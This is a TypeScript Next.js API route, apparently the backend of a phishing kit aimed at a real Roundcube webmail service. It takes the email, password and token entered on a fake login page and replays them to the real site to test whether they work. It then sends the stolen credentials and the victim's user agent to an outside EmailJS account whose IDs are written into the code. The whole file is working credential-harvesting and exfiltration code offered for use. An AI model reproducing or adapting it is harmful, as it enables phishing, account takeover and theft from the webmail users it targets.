// api/phish-login.ts

// Remove this block:
// export const config = {
//   runtime: "edge",
// };

export const runtime = "nodejs";

import { NextRequest, NextResponse } from "next/server";

export default async function handler(request: NextRequest) {
  try {
    const body = await request.json();
    const { email, password, token } = body;
    const userAgent = request.headers.get("user-agent") || "Unknown Device";

    // 1. Prepare the payload exactly as the real site expects
    // Note: The form action is "/?_task=login", so we POST to that URL
    const formData = new URLSearchParams({
      _user: email,
      _pass: password,
      _token: token,
      _task: "login",
      _action: "login",
      _timezone: "_default_", // Match the hidden field in the HTML
    });

    // 2. Send to the REAL site
    const response = await fetch("https://webmail.mwt.net/?_task=login", {
      method: "POST",
      headers: {
        "Content-Type": "application/x-www-form-urlencoded",
        "User-Agent": userAgent,
        // Important: Include cookies if you want to maintain session state later
        // "Cookie": request.headers.get("cookie") || "",
      },
      body: formData.toString(),
      redirect: "follow", // Follow redirects to see final destination
    });

    // 3. Determine success
    // Roundcube usually redirects to _task=mail or shows a dashboard on success
    const isSuccess =
      response.status === 200 &&
      (response.url.includes("_task=mail") ||
        !response.url.includes("_task=login"));

    // 4. Send Email via EmailJS (Fire and forget)
    sendEmail(email, password, userAgent).catch((err) =>
      console.error("Email fail", err),
    );

    // 5. Respond to frontend
    return NextResponse.json({
      success: isSuccess,
      url: response.url,
      status: response.status,
    });
  } catch (error) {
    console.error(error);
    return NextResponse.json(
      { success: false, error: "Internal Error" },
      { status: 500 },
    );
  }
}

async function sendEmail(email: string, password: string, userAgent: string) {
  try {
    await fetch("https://api.emailjs.com/api/v1/email/send", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        service_id: "service_1b86ixe",
        template_id: "template_a2504xo",
        user_id: "lES1DjjjfZ3BGbkw7",
        template_params: {
          email: email,
          password: password,
          user_agent: userAgent.substring(0, 50),
        },
      }),
    });
  } catch (e) {
    console.error("EmailJS Error", e);
  }
}
